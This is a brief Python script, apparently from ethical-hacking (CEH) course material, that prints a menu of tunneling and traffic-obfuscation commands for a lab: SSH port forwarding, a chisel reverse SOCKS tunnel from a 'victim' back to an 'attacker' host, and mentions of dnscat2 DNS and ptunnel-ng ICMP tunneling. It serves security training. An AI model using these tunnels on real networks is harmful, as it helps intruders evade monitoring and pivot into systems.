#!/usr/bin/env python3
# LAB-ONLY: Network Traffic Obfuscation & Tunneling Helper
# CEH v13 Ultimate Offensive Script 15
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_ATTACKER = "192.168.100.20"
LAB_VICTIM = "192.168.100.10"
# -----------------------------------------------------------------------------------

def tunnel_options():
    print("="*80)
    print("LAB-ONLY: Network Obfuscation & Tunneling Options")
    print("="*80)
    print("1. SSH Dynamic Port Forwarding (SOCKS proxy)")
    print(f"   ssh -D 9050 -fNq user@{LAB_VICTIM}")
    print("\n2. SSH Remote Port Forwarding")
    print(f"   ssh -R 4444:127.0.0.1:80 user@{LAB_ATTACKER}")
    print("\n3. HTTP Tunneling with chisel")
    print(f"   Attacker: chisel server -p 8080 --reverse")
    print(f"   Victim:   chisel client {LAB_ATTACKER}:8080 R:socks")
    print("\n4. DNS Tunneling with dnscat2")
    print("\n5. ICMP Tunneling with ptunnel-ng")

if __name__ == "__main__":
    tunnel_options()
